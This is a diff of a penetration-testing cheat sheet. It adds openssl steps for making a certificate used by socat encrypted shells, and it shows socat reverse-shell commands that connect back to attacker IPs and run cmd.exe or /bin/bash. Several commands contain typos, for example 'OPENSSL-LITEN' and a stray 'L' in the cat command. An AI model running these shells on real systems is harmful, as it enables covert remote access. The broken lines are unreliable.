@@ -397,7 +397,14 @@ If you are interested in more depth on this matter check out the cyberchef's web
 * **encrypted reverse shell:** `socat -d -d OPENSSL-LITEN:5557,cert=bind)shell.pem,verify=0,fork STDOUT`
 * **connecting back with encryption from Windows:** `socat OPENSSL:192.168.119.198:5556,verify=0 EXEC:'cmd.exe',pipes`
 * **if victim was a Linux machine this is the synthax:** `socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash`
-* you also have to generate a certificate first, see more details **[here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)**
+* you also have to generate a certificate first, see more details **[here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)**  (check that link out, it's a great blog post)
+* For generating the cert here is a quick description from the source link above: "We will use openssl encryption for this which is very easy to accomplish. We start by generating a key and a certificate using the following command:
+
+`openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt`
+
+This will create the key file named `bind.key` and the certificate file named `bind.crt`. In order to be able to use them we just need to convert them to a .pem file which is super easy as we simply have to concatenate them using the following command.
+
+`cat bind.key bind.crt L > bind.pem"`
 
 ## ssh
 
